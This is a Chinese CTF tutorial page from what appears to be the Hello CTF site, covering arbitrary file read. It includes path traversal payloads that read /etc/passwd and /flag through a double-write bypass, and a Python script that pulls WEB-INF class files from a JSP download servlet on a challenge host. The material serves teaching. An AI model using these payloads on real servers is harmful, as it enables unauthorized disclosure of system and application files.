@@ -1,0 +1,1133 @@
+
+
+
+
+
+<!DOCTYPE html>
+<html lang="zh" dir="ltr">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+    <title>任意文件读取 | Hello CTF</title>
+  
+  <meta name="description" content="开源免费、新手友好的CTF(Capture The Flag,夺旗赛)入门教程">
+  <link rel="icon" href="../../assets/images/favicon.png">
+
+  <!-- 字体（与首页同源） -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Noto+Sans+SC:wght@400;500;700;800&display=swap" rel="stylesheet">
+
+  <!-- material 文章排版 CSS（pin 9.7.7 的 hash 文件名，升级主题时同步更新） -->
+  <link rel="stylesheet" href="../../assets/stylesheets/main.ec1eaa64.min.css">
+  <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+
+  <!-- Hello-CTF 外壳 -->
+  <link rel="stylesheet" href="../../shell/shell.css">
+  <link rel="stylesheet" href="../../shell/shell-docs.css">
+  <link rel="stylesheet" href="../../shell/shell-article.css">
+
+  <!-- 站点原有 extra_css（katex CDN / extra.css / bannerSlider.css 等） -->
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.8/dist/katex.min.css">
+  
+    <link rel="stylesheet" href="../../stylesheets/extra.css">
+  
+
+  <!-- admonition 等组件的图标 SVG 变量（原由 material base.html 注入） -->
+  
+
+
+
+  
+  
+  
+
+<script id="__analytics">function __md_analytics(){function e(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],e("js",new Date),e("config","G-V9998CDNR1"),document.addEventListener("DOMContentLoaded",(function(){document.forms.search&&document.forms.search.query.addEventListener("blur",(function(){this.value&&e("event","search",{search_term:this.value})}));document$.subscribe((function(){var t=document.forms.feedback;if(void 0!==t)for(var a of t.querySelectorAll("[type=submit]"))a.addEventListener("click",(function(a){a.preventDefault();var n=document.location.pathname,d=this.getAttribute("data-md-value");e("event","feedback",{page:n,data:d}),t.firstElementChild.disabled=!0;var r=t.querySelector(".md-feedback__note [data-md-value='"+d+"']");r&&(r.hidden=!1)})),t.hidden=!1})),location$.subscribe((function(t){e("config","G-V9998CDNR1",{page_path:t.pathname})}))}));var t=document.createElement("script");t.async=!0,t.src="https://www.googletagmanager.com/gtag/js?id=G-V9998CDNR1",document.getElementById("__analytics").insertAdjacentElement("afterEnd",t)}</script>
+</head>
+<body data-md-color-scheme="default">
+
+  <!-- 主题初始化（先于渲染，避免闪烁）：hc-theme → shell data-theme + material slate -->
+  <script>
+    (function () {
+      var t = null;
+      try { t = localStorage.getItem("hc-theme"); } catch (e) {}
+      if (t) {
+        document.documentElement.dataset.theme = t;
+        document.body.setAttribute("data-md-color-scheme", t === "dark" ? "slate" : "default");
+      }
+    })();
+    window.__md_palette_sync = function (t) {
+      document.body.setAttribute("data-md-color-scheme", t === "dark" ? "slate" : "default");
+    };
+  </script>
+
+  <script src="../../shell/search.js"></script>
+  <script src="../../shell/shell.js"></script>
+  <script>Shell.mount({ active: "" });</script>
+
+  <!-- 主区：顶部文档导航 + 文章 + TOC -->
+  <div class="main">
+    <nav class="hc-topnav" aria-label="文档导航">
+      <div class="hc-topnav-inner">
+        
+          
+          
+            <a class="tn-item tn-single" href="../../hc-start/"><svg class="ic tn-ico"><use href="#i-book"/></svg>快速开始</a>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-book"/></svg>前言<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-preface/">前言</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-preface/about/">关于本书</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-preface/usage/">食用方法</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-preface/join/">加入我们</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-wrench"/></svg>环境<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-env/">环境配置</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-env/CTFtool/">工具一览</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-env/Docker_On_Linux/">Docker环境</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-env/Crypto/">Crypto环境设置</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-puzzle"/></svg>MISC<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-misc/">MISC | 杂项</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/osint/">信息收集</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/Encode_extra/">编码扩展</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/file/">文件基础</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/Archivefile/">压缩包</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/stego/">图片隐写</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/file_stego/">文件隐写</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/audio_stego/">音频隐写</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/pcap/">流量分析</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/industrial/">工控类</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/memory/">内存取证</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/file_sign/">附:文件签名表</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item on">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-globe"/></svg>Web<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../">Web | 网络攻防</a>
+    
+  
+    
+      <a class="tn-link" href="../web_start/">Web入门题单</a>
+    
+  
+    
+      <a class="tn-link" href="../sensitive_info/">敏感信息泄露</a>
+    
+  
+    
+      <a class="tn-link" href="../php_basic/">PHP基础</a>
+    
+  
+    
+      <a class="tn-link" href="../php_unser_base/">PHP反序列化基础</a>
+    
+  
+    
+      <a class="tn-link" href="../sql_injection/">SQL注入</a>
+    
+  
+    
+      <a class="tn-link" href="../xss/">XSS攻击</a>
+    
+  
+    
+      <a class="tn-link" href="../include/">文件包含</a>
+    
+  
+    
+      <a class="tn-link" href="../ssti/">SSTI注入</a>
+    
+  
+    
+      <a class="tn-link" href="../xxe/">XXE注入</a>
+    
+  
+    
+      <a class="tn-link" href="../ssrf/">SSRF注入</a>
+    
+  
+    
+      <a class="tn-link" href="../php_code_audit/">PHP 代码审计</a>
+    
+  
+    
+      <a class="tn-link" href="../rce/">RCE</a>
+    
+  
+    
+      <a class="tn-link" href="../file_upload/">文件上传</a>
+    
+  
+    
+      <a class="tn-link" href="../dir_traversal/">目录穿越</a>
+    
+  
+    
+      <a class="tn-link" href="../logical_vuln/">逻辑漏洞</a>
+    
+  
+    
+      <a class="tn-link on" href="./">任意文件读取</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-lock"/></svg>Crypto<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-crypto/">Crypto | 密码学</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-crypto/Recap/">前情提要</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-crypto/Encode/">编码基础</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-crypto/Classicalcipher/">古典密码</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-crypto/Moderncipher/">现代密码</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-cpu"/></svg>Reverse<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-reverse/">逆向工程</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%BC%95%E5%AF%BC%E7%AF%87%EF%BC%9A%E7%81%B5%E9%AD%82FAQ/">引导篇：灵魂FAQ</a>
+    
+  
+    
+      <div class="tn-group">编译与可执行文件</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-reverse/C%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/">C语言基础</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%AD%98%E5%82%A8%E7%BB%93%E6%9E%84/">存储结构</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/Quick%20Start%EF%BC%9A%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6/">可执行文件</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">交互式反汇编工具IDA</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-reverse/StartWithIDA/">从零开始的IDA</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/IDA%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/">IDA动态调试</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">常见算法</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%9F%BA%E6%9C%AC%E8%BF%90%E7%AE%97/">基本运算</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E7%BC%96%E7%A0%81%E5%9F%BA%E7%A1%80/">编码基础</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%AD%97%E8%8A%82%E6%B5%81%E7%AE%97%E6%B3%95/">字节流算法</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81/">分组密码</a>
+    
+  
+
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/z3%E7%BA%A6%E6%9D%9F%E6%B1%82%E8%A7%A3/">z3约束求解</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/Quick%20Start%EF%BC%9AASM%E6%B1%87%E7%BC%96/">x86 汇编初步</a>
+    
+  
+    
+      <div class="tn-group">代码保护与对抗</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E8%8A%B1%E6%8C%87%E4%BB%A4/">花指令</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84%E5%A3%B3/">加壳</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/VM/">VM</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/SMC/">SMC</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/">异常处理</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%A4%9A%E7%BA%BF%E7%A8%8B/">多线程</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/TLS%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0/">TLS回调函数</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%8F%8D%E8%B0%83%E8%AF%95/">反调试</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E6%8E%A7%E5%88%B6%E6%B5%81%E5%B9%B3%E5%9D%A6%E5%8C%96/">控制流平坦化</a>
+    
+  
+
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/">符号执行</a>
+    
+  
+    
+      <div class="tn-group">语言与框架</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-reverse/Python/">Python</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/NET/">.NET</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/Rust/">Rust</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/JavaScript/">JavaScript</a>
+    
+  
+
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/Android/">Android平台</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E8%A7%A3%E9%A2%98%E6%8A%80%E5%B7%A7/">解题技巧</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-terminal"/></svg>Pwn<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-pwn/">Pwn | 二进制安全</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-pwn/wsl2_environment/">wsl2下的环境配置</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-pwn/Asm_x86/">汇编语言(x86)</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-pwn/Stack_Overflow/">栈上数组越界&栈溢出</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-pwn/ROP/">ROP入门</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-pwn/ROP_Tricks/">常见的ROP技巧</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-pwn/rop_add_v1/">ROP进阶</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-pwn/Protections/">常见保护</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-shield"/></svg>AWD<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-awd/awd_about/">AWD介绍</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-awd/awd_platform/">AWD平台</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-awd/awd_web.exp/">【WEB】AWD技巧</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-awd/awd_pwn.exp/">【PWN】AWD技巧</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-bot"/></svg>AI<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-ai/">AI | 人工智能</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-ai/What_is_AI/">初识AI</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-ai/MLP/">你的第一个神经网络</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-link"/></svg>区块链<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <div class="tn-group">Move</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-blockchain/Move/0x00/">从0开始的签到题</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-blockchain/Move/0x01/">独特的所有权</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-blockchain/Move/0x02/">神奇的时钟</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-blockchain/Move/0x03/">对象与燃气</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-blockchain/Move/0x04/">多样的泛型</a>
+    
+  
+
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-tag"/></svg>附录<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-appendix/how-to-ask/">提问的智慧</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-appendix/CTFevent/">CTF赛事</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-appendix/NSSCTF_Usage/">NSSCTF平台使用</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-appendix/book/">推荐书单</a>
+    
+  
+</div>
+            </div>
+          
+        
+      </div>
+    </nav>
+    <div class="doc-layout">
+      <article class="md-typeset hc-article">
+        <!-- Tags -->
+
+
+<!-- Actions -->
+<!-- Actions -->
+
+
+  <!-- Edit button -->
+  
+
+  <!-- View button -->
+  
+
+
+<!-- Page content -->
+<div><h1 id="_1">任意文件读取<a class="headerlink" href="#_1" title="Permanent link">¶</a></h1>
+<!-- Imported from D:\\Book\\Web\\Chapter23\23-1.md -->
+<h3 id="_2">双写绕过<a class="headerlink" href="#_2" title="Permanent link">¶</a></h3>
+<p><img alt="" src="https://pic1.imgdb.cn/item/68386eb558cb8da5c81ae6d7.png"></p>
+<p>发现 <code>file</code> 参数是文件名形式</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/68386eeb58cb8da5c81ae6f2.png"></p>
+<p>尝试直接读取 <code>/etc/passwd</code> 无果</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="o">?</span><span class="nx">file</span><span class="o">=</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="nx">etc</span><span class="o">/</span><span class="nx">passwd</span>
+</code></pre></div>
+<p><img alt="" src="https://pic1.imgdb.cn/item/6838704458cb8da5c81ae772.png"></p>
+<p>双写可以绕过</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="o">?</span><span class="nx">file</span><span class="o">=</span><span class="p">....</span><span class="c1">//....//....//....//....//etc/passwd</span>
+</code></pre></div>
+<p><img alt="" src="https://pic1.imgdb.cn/item/6838708258cb8da5c81ae79d.png"></p>
+<p>换成 <code>/flag</code> 通关</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="o">?</span><span class="nx">file</span><span class="o">=</span><span class="p">....</span><span class="c1">//....//....//....//....//flag</span>
+</code></pre></div>
+<p><img alt="" src="https://pic1.imgdb.cn/item/683870bf58cb8da5c81ae7bf.png"></p>
+<!-- Imported from D:\\Book\\Web\\Chapter23\23-2.md -->
+<h3 id="jsp">JSP 网站敏感文件遍历读取<a class="headerlink" href="#jsp" title="Permanent link">¶</a></h3>
+<p><img alt="" src="https://pic1.imgdb.cn/item/68387fcb58cb8da5c81b1728.png"></p>
+<p>打开网页</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/68387fe758cb8da5c81b17e4.png"></p>
+<p>点击提示，用 JSP 写的网站，给的是一个下载接口，需要 POST 请求</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/68387ff958cb8da5c81b185a.png"></p>
+<p>编写脚本遍历一些常见的敏感文件</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>
+<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="k">def</span><span class="w"> </span><span class="nf">test_download</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
+<a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>    <span class="n">url</span> <span class="o">=</span> <span class="s2">"http://challenge.qsnctf.com:31930/DownloadServlet"</span>
+<a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+<a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>        <span class="s1">'Content-Type'</span><span class="p">:</span> <span class="s1">'application/x-www-form-urlencoded'</span><span class="p">,</span>
+<a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a>        <span class="s1">'Accept-Charset'</span><span class="p">:</span> <span class="s1">'UTF-8'</span>
+<a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a>    <span class="p">}</span>
+<a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a>    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s1">'filename'</span><span class="p">:</span> <span class="n">filename</span><span class="p">}</span>
+<a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a>
+<a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a>    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
+<a id="__codelineno-3-12" name="__codelineno-3-12" href="#__codelineno-3-12"></a>
+<a id="__codelineno-3-13" name="__codelineno-3-13" href="#__codelineno-3-13"></a>    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"Testing </span><span class="si">{</span><span class="n">filename</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
+<a id="__codelineno-3-14" name="__codelineno-3-14" href="#__codelineno-3-14"></a>    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"Status: </span><span class="si">{</span><span class="n">response</span><span class="o">.</span><span class="n">status_code</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
+<a id="__codelineno-3-15" name="__codelineno-3-15" href="#__codelineno-3-15"></a>    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"Content-Type: </span><span class="si">{</span><span class="n">response</span><span class="o">.</span><span class="n">headers</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'Content-Type'</span><span class="p">,</span><span class="w"> </span><span class="s1">'Not Set'</span><span class="p">)</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
+<a id="__codelineno-3-16" name="__codelineno-3-16" href="#__codelineno-3-16"></a>
+<a id="__codelineno-3-17" name="__codelineno-3-17" href="#__codelineno-3-17"></a>    <span class="c1"># 如果是 class 文件，保存下来</span>
+<a id="__codelineno-3-18" name="__codelineno-3-18" href="#__codelineno-3-18"></a>    <span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">headers</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'Content-Type'</span><span class="p">)</span> <span class="o">==</span> <span class="s1">'application/octet-stream'</span><span class="p">:</span>
+<a id="__codelineno-3-19" name="__codelineno-3-19" href="#__codelineno-3-19"></a>        <span class="n">filename_only</span> <span class="o">=</span> <span class="n">filename</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">'/'</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+<a id="__codelineno-3-20" name="__codelineno-3-20" href="#__codelineno-3-20"></a>        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename_only</span><span class="p">,</span> <span class="s1">'wb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+<a id="__codelineno-3-21" name="__codelineno-3-21" href="#__codelineno-3-21"></a>            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">content</span><span class="p">)</span>
+<a id="__codelineno-3-22" name="__codelineno-3-22" href="#__codelineno-3-22"></a>        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"Saved to </span><span class="si">{</span><span class="n">filename_only</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
+<a id="__codelineno-3-23" name="__codelineno-3-23" href="#__codelineno-3-23"></a>
+<a id="__codelineno-3-24" name="__codelineno-3-24" href="#__codelineno-3-24"></a>    <span class="nb">print</span><span class="p">(</span><span class="s2">"-"</span> <span class="o">*</span> <span class="mi">50</span><span class="p">)</span>
+<a id="__codelineno-3-25" name="__codelineno-3-25" href="#__codelineno-3-25"></a>
+<a id="__codelineno-3-26" name="__codelineno-3-26" href="#__codelineno-3-26"></a><span class="c1"># 测试路径</span>
+<a id="__codelineno-3-27" name="__codelineno-3-27" href="#__codelineno-3-27"></a><span class="n">paths</span> <span class="o">=</span> <span class="p">[</span>
+<a id="__codelineno-3-28" name="__codelineno-3-28" href="#__codelineno-3-28"></a>    <span class="s2">"WEB-INF/classes/com/ctf/file/DownloadServlet.class"</span><span class="p">,</span>
+<a id="__codelineno-3-29" name="__codelineno-3-29" href="#__codelineno-3-29"></a>    <span class="s2">"WEB-INF/classes/com/ctf/flag/FlagManager.class"</span><span class="p">,</span>
+<a id="__codelineno-3-30" name="__codelineno-3-30" href="#__codelineno-3-30"></a>    <span class="s2">"WEB-INF/classes/com/ctf/flag/flag.txt"</span><span class="p">,</span>
+<a id="__codelineno-3-31" name="__codelineno-3-31" href="#__codelineno-3-31"></a>    <span class="s2">"WEB-INF/classes/flag.txt"</span><span class="p">,</span>
+<a id="__codelineno-3-32" name="__codelineno-3-32" href="#__codelineno-3-32"></a>    <span class="s2">"WEB-INF/classes/flag"</span><span class="p">,</span>
+<a id="__codelineno-3-33" name="__codelineno-3-33" href="#__codelineno-3-33"></a>    <span class="s2">"../classes/com/ctf/flag/FlagManager.class"</span>
+<a id="__codelineno-3-34" name="__codelineno-3-34" href="#__codelineno-3-34"></a><span class="p">]</span>
+<a id="__codelineno-3-35" name="__codelineno-3-35" href="#__codelineno-3-35"></a>
+<a id="__codelineno-3-36" name="__codelineno-3-36" href="#__codelineno-3-36"></a><span class="k">for</span> <span class="n">path</span> <span class="ow">in</span> <span class="n">paths</span><span class="p">:</span>
+<a id="__codelineno-3-37" name="__codelineno-3-37" href="#__codelineno-3-37"></a>    <span class="n">test_download</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
+</code></pre></div>
+<p>反编译下载的 <code>FlagManager</code> 文件</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/6838818f58cb8da5c81b2372.png"></p>
+<p>编写脚本解密</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="n">key</span> <span class="o">=</span> <span class="p">[</span><span class="mi">110</span><span class="p">,</span> <span class="mi">107</span><span class="p">,</span> <span class="mi">185</span><span class="p">,</span> <span class="mi">183</span><span class="p">,</span> <span class="mi">183</span><span class="p">,</span> <span class="mi">186</span><span class="p">,</span> <span class="mi">103</span><span class="p">,</span> <span class="mi">185</span><span class="p">,</span> <span class="mi">99</span><span class="p">,</span> <span class="mi">105</span><span class="p">,</span> <span class="mi">105</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">105</span><span class="p">,</span> <span class="mi">99</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">184</span><span class="p">,</span> <span class="mi">185</span><span class="p">,</span> <span class="mi">103</span><span class="p">,</span> <span class="mi">99</span><span class="p">,</span> <span class="mi">108</span><span class="p">,</span> <span class="mi">186</span><span class="p">,</span> <span class="mi">107</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">99</span><span class="p">,</span> <span class="mi">183</span><span class="p">,</span> <span class="mi">109</span><span class="p">,</span> <span class="mi">105</span><span class="p">,</span> <span class="mi">184</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">106</span><span class="p">,</span> <span class="mi">106</span><span class="p">,</span> <span class="mi">188</span><span class="p">,</span> <span class="mi">109</span><span class="p">,</span> <span class="mi">186</span><span class="p">,</span> <span class="mi">111</span><span class="p">,</span> <span class="mi">188</span><span class="p">]</span>
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>
+<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="n">flag</span> <span class="o">=</span> <span class="p">[]</span>
+<a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="n">key</span><span class="p">:</span>
+<a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>    <span class="n">c</span> <span class="o">=</span> <span class="p">(</span><span class="n">k</span> <span class="o">^</span> <span class="mi">48</span><span class="p">)</span> <span class="o">-</span> <span class="nb">ord</span><span class="p">(</span><span class="s1">'&amp;'</span><span class="p">)</span>
+<a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>    <span class="n">flag</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">c</span><span class="p">))</span>
+<a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a>
+<a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a><span class="nb">print</span><span class="p">(</span><span class="s1">''</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">flag</span><span class="p">))</span>    <span class="c1"># SQCTF{85caad1c-33e3-0bc1-6d5e-a73b044f7d9f}</span>
+</code></pre></div>
+<!-- Imported from D:\\Book\\Web\\Chapter23\23-3.md -->
